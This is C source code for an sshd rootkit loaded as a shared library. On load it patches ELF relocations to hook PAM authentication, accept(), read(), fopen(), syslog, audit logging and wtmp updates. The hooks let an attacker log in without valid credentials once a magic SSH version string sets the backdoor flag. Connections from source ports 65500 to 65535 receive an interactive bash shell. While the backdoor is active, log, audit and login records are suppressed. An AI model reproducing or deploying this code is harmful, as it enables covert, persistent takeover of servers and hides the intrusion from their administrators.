#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>

#include <security/pam_ext.h>
#include <sys/mman.h>

#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <dlfcn.h>
#include <link.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <utmp.h>

#include "pam_private.h"

#include "bad.h"
#include "config_hook.h"

static int PAGE_SIZE;

int (*old_pam_authenticate)(pam_handle_t *pamh, int flags);
int (*old_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
void (*old_syslog_chk)(int priority, int flag, const char *format);
void (*old_syslog)(int priority, const char *format);
int (*old_audit_log_acct_message)(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result);
int (*old_audit_log_user_message)(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result);

void (*old_updwtmp)(const char *wtmp_file, const struct utmp *ut);

static void handle_sig_with_jmp(int sig)
{
	longjmp(jmpbuf, -1);
}

/*
 * lib = start of lib we search - use get_libstart()
 */
static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
{
	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) {
		if ((void *) map->l_addr == lib) {
			void *libstart = (void *)map->l_addr;

			void *libend = (void *)map->l_next->l_addr;

			bool done = false;

			while (done != true && libstart >= libend) {
				dladdrptr(libstart, dli);

				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, funcname) == 0) {
						void *tmp = dli->dli_saddr;
						free(dli);
						return tmp;
					}
				}
				libstart += 16;
			}
		}
		map = map->l_next;
	}

	free(dli);
	return NULL;
}

static void *get_libstart(struct link_map *link_map, char *lib)
{
	struct link_map *map = link_map;

	while (map != NULL) {
		if (strstr(map->l_name, lib) != NULL)
			return (void *)map->l_addr;

		map = map->l_next;
	}

	return NULL;
}

/*
 * Parse a dynamic section array for useful pointers
 * 	pointers passed in should always be checked - very possible to fail
 */
static void parse_dyn_array(Elf64_Dyn *dynptr,Elf64_Rela **RELA, uint64_t **RELASZ,
								Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
{
	*RELA = NULL;
	*RELASZ = NULL;
	*JMPREL = NULL;
	*PLTRELSZ = NULL;	

	int i;
	for (i = 0; dynptr[i].d_tag != DT_NULL; i++) {
		if (dynptr[i].d_tag == DT_RELA)
			*RELA = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_JMPREL)
			*JMPREL = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_PLTRELSZ)
			*PLTRELSZ = (uint64_t *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_RELASZ)
			*RELASZ = (uint64_t *) &dynptr[i].d_un;
	}
	return;
}

/*
 * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
 *	with the func we want to hook...
 */
static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
{
	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));

	int i;
	for (i = 0; i < relaments; i++) {
		if ((void *) RELA[0].r_addend == func) {
			*type = RELOC_ADDEND;
			return RELA;
		}
		
		if ((void *) RELA[0].r_info == func) {
			*type = RELOC_INFO;
			return RELA;
		}

		if ((void *) RELA[0].r_offset == func) {
			*type = RELOC_OFFSET;
			return RELA;
		}

		RELA = (Elf64_Rela *) ((char *) RELA + (uint64_t) (sizeof(Elf64_Rela)));
	}
	return NULL;
}

/*
 * the callback for dl_iterate_phdr
 */
static Elf64_Dyn *libpam;
static int callback(struct dl_phdr_info *info, size_t size, void *data)
{
	if (null1 != NULL && null2 != NULL && libc != NULL)
		return 0;	

	int j;

	for (j = 0; j < info->dlpi_phnum; j++) {
		
		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
			if (strstr(info->dlpi_name, ".so") == NULL) {
				if (info->dlpi_phnum == (unsigned)9) {
					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
				if (info->dlpi_phnum == (unsigned)4) {
					null2 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
			}
			if (strstr(info->dlpi_name, "libc.so") != NULL) {
				libc = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
				break;
			}
			if (strstr(info->dlpi_name, "libpam.so") != NULL) {
				libpam = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
				break;
			}
		}
	}
	return 0;
}

/*
 *
 */
static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
{
	int ret;
	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
	if (ret != 0)
		return -1;

	if (type == RELOC_ADDEND)
		foundrela->r_addend = (unsigned long long) func; 
	else if (type == RELOC_INFO)
		foundrela->r_info = (unsigned long long) func; 
	else if (type == RELOC_OFFSET)
		foundrela->r_offset = (unsigned long long) func;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
	if (ret != 0)
		return -1;

	return 0;
}

static int is_sshd(struct link_map *link_map)
{
	void *dlhandle = dlopen("libdl.so.2", RTLD_NOW);

	if (dlhandle == NULL)
		return -1;

	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);

	if (dlinfoptr == NULL || dladdrptr == NULL)
		return -1;

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *lib_wrap = dlopen("libwrap.so.0", RTLD_NOW);

	if (lib_wrap == NULL)
		return -1;

	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);

	if (lib_pam == NULL)
		return -1;

	void *hosts_access = dlsym(lib_wrap, "hosts_access");
	old_pam_authenticate = dlsym(lib_pam, "pam_authenticate");

	if (hosts_access == NULL || old_pam_authenticate == NULL)
		return -1;

	dlclose(lib_wrap);
	dlclose(lib_pam);
	return 0;
}

static int new_audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result)
{
	FILE *fp = fopen("/tmp/alam", "w");
	fprintf(fp, "here!\n");
	fclose(fp);
	if(pambd)
		return 0;
	return old_audit_log_acct_message(audit_fd, type, pgname, op, name, id, host, addr, tty, result);
}

static int new_audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result)
{
	FILE *fp = fopen("/tmp/alum", "w");
	fprintf(fp, "here!\n");
	fclose(fp);

	if(pambd)
		return 0;
	return old_audit_log_user_message(audit_fd, type, message, hostname, addr, tty, result);
}

static void new_syslog_chk(int priority, int flag, const char *format, ...)
{
	if(pambd)
		return;

	va_list va;
	va_start(va, format);
	vsyslog(priority, format, va);
	va_end(va);
}

static void new_syslog(int priority, const char *format, ...)
{
	if(pambd)
		return;

	va_list va;
	va_start(va, format);
	vsyslog(priority, format, va);
	va_end(va);
}

static int new_accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	int sock = old_accept(sockfd, addr, addrlen);
	struct sockaddr_in *sa_i = (struct sockaddr_in *) addr;
	if(htons(sa_i->sin_port) >= 65500 && htons(sa_i->sin_port) <= 65535)
	{
		pid_t pid;
		if((pid = fork()) == 0)
		{
			dup2(sock, 0);
			dup2(sock, 1);
			dup2(sock, 2);
			execl("/bin/bash", "/bin/bash", "-i", NULL);
			errno = ECONNABORTED;
			return -1;
		}
		else
		{
			errno = ECONNABORTED;
			return -1;
		}
	}

return sock;
}

/*
 *
 */
static int my_pam_auth(struct pam_handle *pamh, int flags)
{
	__asm__ (
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		);

if(pambd)
{
	return 0;
}

return old_pam_authenticate(pamh,flags);
}


void new_updwtmp(const char *wtmp_file, const struct utmp *ut)
{
	if(pambd)
		return;
	old_updwtmp(wtmp_file, ut);
	return;
}


static void  __attribute__ ((constructor)) init(void)
{
	strcpy(magicstr,"SSH-2.0-OpenSSZ_7.3p1");
	magiclen = strlen(magicstr);
	magiccnt = 0;

	struct link_map *link_map;

	if (is_sshd(link_map) != 0)
		return;

	PAGE_SIZE = getpagesize();

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *o = dlopen("libdl.so.2", RTLD_NOW);
	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
	dlclose(o);
	dl_iterate_phdrptr(callback, NULL);

	if (null1 == NULL)
		return;

	/* XXX: all of this crap deserves a wrapper - ? muh modularity */

	Elf64_Rela *RELA, *JMPREL;
	uint64_t *RELASZ, *PLTRELSZ;
	int type;

	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;

	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);
	old_pam_authenticate = dlsym(lib_pam, "pam_authenticate");

	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, old_pam_authenticate, &type);
	if (foundrela == NULL)
		return;

	int jmpret = setjmp(jmpbuf);
	if (jmpret != 0) { /* PANIC */
		kill(getpid(), SIGSEGV);
		return;
	}

	signal(SIGSEGV, handle_sig_with_jmp);
	signal(SIGBUS, handle_sig_with_jmp);
	
	hook_rela(foundrela, my_pam_auth, type);
	signal(SIGSEGV, SIG_DFL);
	signal(SIGBUS, SIG_DFL);

	/* fopen() hook */

	void *lib_c = dlopen("libc.so.6", RTLD_NOW);
	ref_fopen = dlsym(lib_c, "fopen");

	/* the relocation of fopen lives within sshd's .dynamic */
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;

	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
	foundrela = parse_rela(RELA, RELASZ, ref_fopen, &type);
	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
		foundrela = parse_rela(JMPREL, PLTRELSZ, ref_fopen, &type);
	if (foundrela == NULL) /* :( */
		return;

	
	ref_fopen_Rela = foundrela;
	hook_rela(foundrela, my_fopen, type);

	old_accept = dlsym(lib_c, "accept");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
                return;

    foundrela = parse_rela(RELA, RELASZ, old_accept, &type);
    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
            foundrela = parse_rela(JMPREL, PLTRELSZ, old_accept, &type);
    if (foundrela == NULL) /* :( */
            return;
	hook_rela(foundrela, new_accept, type);



	ref_read = dlsym(lib_c, "read");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
                return;

    foundrela = parse_rela(RELA, RELASZ, ref_read, &type);
    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
            foundrela = parse_rela(JMPREL, PLTRELSZ, ref_read, &type);
    if (foundrela == NULL) /* :( */
            return;

	ref_fopen_Rela = foundrela;
	ref_read_type = type;
	hook_rela(foundrela, new_read, type);

	FILE *fp = fopen("/tmp/hooklog", "w");
	

	// TODO: find out why this isn't working!
	old_syslog = dlsym(lib_c, "syslog");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
        return;

    foundrela = parse_rela(RELA, RELASZ, old_syslog, &type);
    if (foundrela == NULL) // the relocation wasn't in DT_RELA ...
            foundrela = parse_rela(JMPREL, PLTRELSZ, old_syslog, &type);
    if (foundrela != NULL)
    {
		hook_rela(foundrela, new_syslog, type);

		fprintf(fp, "syslog - ok\n");
		fflush(fp);
    }
    else
    {
		fprintf(fp, "syslog - not ok\n");
		fflush(fp);
    }
	

	old_syslog_chk = dlsym(lib_c, "__syslog_chk");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
        return;

    foundrela = parse_rela(RELA, RELASZ, old_syslog_chk, &type);
    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
            foundrela = parse_rela(JMPREL, PLTRELSZ, old_syslog_chk, &type);
    if (foundrela == NULL) /* :( */
            return;
	hook_rela(foundrela, new_syslog_chk, type);
	fprintf(fp, "syslog_chk - ok\n");
	fflush(fp);


	old_audit_log_user_message = dlsym(lib_c, "audit_log_user_message");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
        return;

    foundrela = parse_rela(RELA, RELASZ, old_audit_log_user_message, &type);
    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
            foundrela = parse_rela(JMPREL, PLTRELSZ, old_audit_log_user_message, &type);
    if (foundrela == NULL) /* :( */
            return;
	hook_rela(foundrela, new_audit_log_user_message, type);
	fprintf(fp, "audit_log_user_message - ok\n");
	fflush(fp);

	old_audit_log_acct_message = dlsym(lib_c, "audit_log_acct_message");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
        return;

    foundrela = parse_rela(RELA, RELASZ, old_audit_log_acct_message, &type);
    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
            foundrela = parse_rela(JMPREL, PLTRELSZ, old_audit_log_acct_message, &type);
    if (foundrela == NULL) /* :( */
            return;
	hook_rela(foundrela, new_audit_log_acct_message, type);
	fprintf(fp, "audit_log_acct_message - ok\n");


	old_updwtmp = dlsym(lib_c, "updwtmp");
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
        return;

    foundrela = parse_rela(RELA, RELASZ, old_updwtmp, &type);
    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
            foundrela = parse_rela(JMPREL, PLTRELSZ, old_updwtmp, &type);
    if (foundrela == NULL) /* :( */
            return;
	hook_rela(foundrela, new_updwtmp, type);
	fprintf(fp, "updwtmp - ok\n");
	fflush(fp);


	fflush(fp);
	fclose(fp);
	

	dlclose(lib_pam);
	dlclose(lib_c);	
	return; /* XXX use exit() ? */
}
